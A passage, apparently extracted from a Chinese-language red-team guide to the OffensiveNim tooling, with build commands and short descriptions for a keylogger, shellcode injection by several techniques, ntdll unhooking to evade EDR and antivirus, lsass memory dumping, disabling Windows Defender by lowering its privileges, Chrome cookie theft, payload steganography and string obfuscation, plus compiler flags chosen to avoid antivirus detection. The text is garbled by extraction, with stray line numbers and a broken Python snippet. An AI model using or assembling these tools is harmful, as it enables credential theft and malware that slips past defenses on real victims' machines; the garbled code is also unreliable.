    new ActiveXObject('WScript.Shell').Run('calc.exe');
  }
]]>
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
54
通过MSScriptControl动态执⾏VBScript和JScript，仅⽀持32位程序。 
通过Excel COM组件和宏代码注⼊shellcode，需要本机有安装excel。 
编译
运⾏
excel_com_bin.nim 
作⽤
编译
Bash
复制代码
nim cc --app=console --cpu=i386 -d:release -d:strip --
out=bin/scriptcontrol_bin32.exe src\scriptcontrol_bin.nim
1
Bash
复制代码
nim cc --app=console --cpu=amd64 -d:release -d:strip --
out=bin/excel_com_bin64.exe src\excel_com_bin.nim
1
55
执⾏失败
通过函数SetWindowsHookEx设置窗⼝钩⼦实现键盘记录器。r 
运⾏
keylogger_bin.nim 
作⽤
编译
Bash
复制代码
nim cc --app=console --cpu=amd64 -d:release -d:strip --
out=bin/keylogger_bin64.exe src\keylogger_bin.nim
1
56
在其他cmd窗⼝输⼊123并回⻋，可以看到已被键盘记录器捕获 
将shellcode转换成uuid数组形式，并通过EnumSystemLocalesA回调函数执⾏shellcode。 
使⽤以下py代码将shellcode转换成uuid数组形式。 
运⾏
uuid_exec_bin.nim 
作⽤
编译
57
Python
复制代码
import uuid, sys
def bin2uuid_array(data):
    if len(data) ' % __file__)
    else:
        with open(sys.argv[1], 'rb') as f:
            data = f.read()
        uuid_array = bin2uuid_array(data)
        print(uuid_array)
        print("uuid array size: %d" % len(uuid_array.split(',')))
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
58
替换代码当中的uuid数组，编译 
Bash
复制代码
nim cc --app=console --cpu=amd64 -d:release -d:strip --
out=bin/uuid_exec_bin64.exe  src\uuid_exec_bin.nim
1
59
通过嵌⼊C代码实现unhook ntdll绕过EDR/AV检测。 
运⾏
unhookc.nim 
作⽤
编译
60
纯nim代码实现unhook ntdll绕过EDR/AV检测。 
运⾏
unhook.nim 
作⽤
编译
Bash
复制代码
nim cc --app=console --cpu=amd64 -d:release -d:strip --passL:-lpsapi  --
out=bin/unhookc64.exe src\unhookc.nim
1
Bash
复制代码
nim cc --app=console --cpu=amd64 -d:release -d:strip --
out=bin/unhook64.exe src\unhook.nim
1
61
将shellcode注⼊进程管理器(TaskBar)进程。 
运⾏
taskbar_ewmi_bin.nim 
作⽤
编译
Bash
复制代码
nim cpp --app=console --cpu=amd64 -d:release -d:strip --
out=bin/taskbar_ewmi_bin64.exe src\taskbar_ewmi_bin.nim
1
62
但MSF Console没有收到session。 
滥⽤fork机制dump lsass进程得内存。 
运⾏
fork_dump_bin.nim 
作⽤
编译
63
运⾏结果没有返回成功。
通过COM组件调⽤查询ldap。 
运⾏
ldap_query_bin.nim 
作⽤
编译
Bash
复制代码
nim cc --app=console --cpu=amd64 -d:release -d:strip --
out=bin/fork_dump_bin64.exe src\fork_dump_bin.nim
1
64
运⾏结果报错。
对指定进程进⾏降权处理，例如降权Windows Defender进程，使其保护失效。 
运⾏
sandbox_process_bin.nim 
作⽤
编译
Bash
复制代码
nim cc --app=console --cpu=amd64 -d:release -d:strip --
out=bin/ldap_query_bin64.exe src\ldap_query_bin.nim
1
Bash
复制代码
nim cc --app=console --cpu=amd64 -d:release -d:strip --
out=bin/sandbox_process_bin64.exe  src\sandbox_process_bin.nim
1
65
给运⾏在特权提升权限下的cmd.exe降权 
通过NetShareEnum api列举远程服务器上得共享⽬录（域内环境）。 
运⾏
list_remote_shares.nim 
作⽤
编译
66
解密chrome的cookie数据库，列举所有保存的cookie信息。 
运⾏
chrome_dump_bin.nim 
作⽤
编译
Bash
复制代码
nim cc --app=console --cpu=amd64 -d:release -d:strip --
out=bin/list_remote_shares64.exe src\list_remote_shares.nim
1
Bash
复制代码
nim cc --app=console --cpu=amd64 -d:release -d:strip --
out=bin/chrome_dump_bin64.exe  src\chrome_dump_bin.nim
1
67
运⾏
68
⾸先创建进程，再设置进程状态为suspened，最后注⼊shellcode到主线程后恢复执⾏。 
suspended_thread_injection.nim 
作⽤
编译
Bash
复制代码
nim cc --app=console --cpu=amd64 -d:release -d:strip --
out=bin/suspended_thread_injection64.exe  
src\suspended_thread_injection.nim
1
69
nim代码实现的图⽚隐写程序，可⽤于payload隐藏。⽀持PNG、BMP、QOI、PPM格式的图⽚隐写。 
测试代码
隐写数据到png图⽚ 
运⾏
steganography 
简介
使⽤
70
读取png图⽚当中隐写的数据 
运⾏
通过宏使⽤随机密钥异或加密nim代码中的字符串，可⽤于避免敏感字符串特征。 
nim-strenc 
简介
Python
复制代码
import steganography, pixie
var image = readImage("steganographyLogo.png")
encodeMessage(image, "Hello world this is really cool")
image.writeFile("steganographyLogoEncoded.png")
1
2
3
4
5
Bash
复制代码
nim cc -d:strip -d:release --hints:off --app:console --cpu:amd64 --
out:steganography_encode64.exe steganography_encode.nim
1
Python
复制代码
import steganography, pixie
var image = readImage("steganographyLogoEncoded.png")
echo decodeMessage(image)
1
2
3
4
Bash
复制代码
nim cc -d:strip -d:release --hints:off --app:console --cpu:amd64 --
out:steganography_decode64.exe steganography_decode.nim
1
71
测试代码
保存到test2.nim，使⽤以下命令编译 
运⾏
strings查看⽂件当中字符串信息。 
此时字符串在⽂件当中以明⽂存储。
下⾯引⼊nim-strenc库，重新编译测试。 
使⽤
Python
复制代码
echo "Mimikatz Fantastic Baby!!!"
1
Python
复制代码
nim cc -d:strip -d:release --app=console --cpu=amd64 --out=bin/test2.exe 
test2.nim
1
72
运⾏看能否正常运⾏
strings匹配字符串 
可以看到，已经成功将字符串混淆。
⽆⽂件内存执⾏exe，可⽤于简单压缩壳模板。 
⾸先编译
Nim-RunPE 
简介
使⽤
Python
复制代码
import strenc
echo "Mimikatz Fantastic Baby!!!"
1
2
Python
复制代码
nim cc -d:strip -d:release --hints:off --app:console --cpu:amd64 --
out:bin/test2.exe test2.nim
1
Bash
复制代码
nim cc -d:strip -d:release --hints:off --app:console --cpu:amd64 --
out:NimRunPE.exe NimRunPE.nim
1
73
执⾏
可以看到内存加载clac.exe成功 
通过读取ntdll.dll，获得⼲净的syscall stub指令并⽤RWX内存存储，最后调⽤⼲净的syscall函数实现
direct syscall注⼊到notepad傀儡进程当中。 
NimGetSyscallStub 
简介
使⽤
74
通过windows 的各种回调触发shellcode执⾏，这⾥⽤到的回调有：CertEnumSystemStore、
CertEnumSystemStoreLocation、CopyFileExW、CopyFile2、EnumChildWindows、
EnumDesktopWindows、EnumPageFilesW、EnumSystemGeoID、ImageGetDigestStream、
SymEnumProcesses 
CertEnumSystemStore 
Nim_CBT_Shellcode 
简介
使⽤
Bash
复制代码
nim cc -d:strip -d:release --hints:off --app:console --cpu:amd64 --
out:ShellcodeInject64.exe ShellcodeInject.nim
1
75
CertEnumSystemStoreLocation 
CopyFileExW 
Bash
复制代码
nim cc -d:strip -d:release --hints:off --app:console --cpu:amd64 --
out:CBT_Cert_EnumSystemStore64.exe CBT_Cert_EnumSystemStore.nim
1
Bash
复制代码
nim cc -d:strip -d:release --hints:off --app:console --cpu:amd64 --
out:CBT_Cert_EnumSystemStoreLocation64.exe 
CBT_Cert_EnumSystemStoreLocation.nim
1
Bash
复制代码
nim cc -d:strip -d:release --hints:off --app:console --cpu:amd64 --
out:CBT_Copy_FileExW64.exe CBT_Copy_FileExW.nim
1
76
CopyFile2 
EnumChildWindows 
Bash
复制代码
nim cc -d:strip -d:release --hints:off --app:console --cpu:amd64 --
out:CBT_Copy264.exe CBT_Copy2.nim
1
Bash
复制代码
nim cc -d:strip -d:release --hints:off --app:console --cpu:amd64 --
out:CBT_Enum_ChildWindows64.exe CBT_Enum_ChildWindows.nim
1
77
EnumDesktopWindows 
EnumPageFilesW 
Bash
复制代码
nim cc -d:strip -d:release --hints:off --app:console --cpu:amd64 --
out:CBT_Enum_DesktopWindows64.exe CBT_Enum_DesktopWindows.nim
1
Bash
复制代码
nim cc -d:strip -d:release --hints:off --app:console --cpu:amd64 --
out:CBT_Enum_PageFilesW64.exe CBT_Enum_PageFilesW.nim
1
78
EnumSystemGeoID 
ImageGetDigestStream 
Bash
复制代码
nim cc -d:strip -d:release --hints:off --app:console --cpu:amd64 --
out:CBT_Enum_SystemGeoID64.exe CBT_Enum_SystemGeoID.nim
1
Bash
复制代码
nim cc -d:strip -d:release --hints:off --app:console --cpu:amd64 --
out:CBT_Image_GetDigestStream64.exe CBT_Image_GetDigestStream.nim
1
79
SymEnumProcesses 
nim实现的AES加密库 
在nimcrypto的examples⽬录下，有nimcrypto⽀持的所有AES加密⽅法，分别是CBC、CFB、CTR、
ECB、GCM、OFB 
CBC代码测试 
nimcrypto 
简介
使⽤
Bash
复制代码
nim cc -d:strip -d:release --hints:off --app:console --cpu:amd64 --
out:CBT_Sym_EnumProcesses64.exe CBT_Sym_EnumProcesses.nim
1
Bash
复制代码
nim cc -d:strip -d:release --hints:off --app:console --cpu:amd64 --
out:cbc64.exe cbc.nim
1
80
CFB代码测试 
CTR代码测试 
Bash
复制代码
nim cc -d:strip -d:release --hints:off --app:console --cpu:amd64 --
out:cfb64.exe cfb.nim
1
Bash
复制代码
nim cc -d:strip -d:release --hints:off --app:console --cpu:amd64 --
out:ctr64.exe ctr.nim
1
81
ECB代码测试 
GCM代码测试 
OFB代码测试 
Bash
复制代码
nim cc -d:strip -d:release --hints:off --app:console --cpu:amd64 --
out:ecb64.exe ecb.nim
1
Bash
复制代码
nim cc -d:strip -d:release --hints:off --app:console --cpu:amd64 --
out:gcm64.exe gcm.nim
1
82
winim包含windows api函数定义、结构体定义、常量定义，并且兼容.net 3.6.0以上。使⽤nim开发
windows平台的红队⼯具winim是核⼼组件。 
oﬀensive-nim仓库的⼤部分例⼦都是调⽤的winim。 
nim版本的SysWhispers3，兼容x64、x86、wow64。 
⽤于⽣成direct syscall的指令，程序当中通过syscall绕过edr hook的监控。 
winim 
简介
使⽤
NimlineWhispers3 
简介
⽤途
zippy 
Bash
复制代码
nim cc -d:strip -d:release --hints:off --app:console --cpu:amd64 --
out:ofb64.exe ofb.nim
1
83
nim代码实现的deﬂate、zlib、gzip格式的压缩⽂件处理。 
对数据进⾏压缩，减⼩⽂件体积
⽤于将nim源码混淆的库 
混淆nim代码 
nim语⾔实现的sqlite数据库读写库 
存储结构化数据到sqlite数据库中 
--opt:size 这个编译选项会对⽣成的⽂件进⾏压缩，但压缩⽅式就是nim会⽤它⾃⼰实现的压缩壳对
代码压缩，不推荐使⽤，因为已经被国外杀软标记
--passc=-ﬂto --passl=-ﬂto 添加这个编译选项也会减少⽣成⽂件的体积，并且没有被杀软标记 
--passL:-Wl,--dynamicbase 由于nim默认编译⽣成的exe是没有重定位表的，这在exe加壳的时候
会产⽣影响，所以可以⽤这个编译选项指定⽣成重定位表
-static 当使⽤cpp即g++编译nim程序时，需要指定添加该编译选项告诉链接器静态链接libc++库，
否则编译的⽂件在其他机器执⾏会报错提示缺少依赖库
简介
⽤途
nugliﬁer 
简介
⽤途
tiny-sqlite 
简介
⽤途
编译命令
●
●
●
●
84
https://web.archive.org/web/20210117002945/https://secbytes.net/Implant-Roulette-Part-
1:-Nimplant 
https://github.com/byt3bl33d3r/OﬀensiveNim#README.md 
参考⽂献
●
●